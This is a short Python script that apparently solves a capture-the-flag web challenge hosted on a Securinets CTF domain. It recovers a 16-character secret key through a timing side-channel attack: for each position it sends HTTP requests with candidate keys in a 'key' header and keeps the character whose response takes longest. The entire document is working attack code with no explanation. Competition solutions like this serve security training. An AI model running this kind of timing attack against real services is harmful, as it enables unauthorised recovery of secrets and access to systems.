import requests
import datetime
import string

URL="https://web1.q20.ctfsecurinets.com/"
charset=string.ascii_lowercase


key=""
while len(key)<16:
    mx=0
    rest='*'
    for i in charset:
        sent=key+i
        sent+="a"*(16-len(sent))
        HEADERS = {'key':sent} 
        r = requests.get(url = URL, headers = HEADERS) 
        realtime=r.elapsed.total_seconds()
        if realtime>mx:
            mx=realtime
            rest=i
        print("The Current Time:"+str(realtime)+ " for "+ sent) # printing for debugging
    # 'Current Flag'
    key+=rest

print('the final key',key)
exit(0)
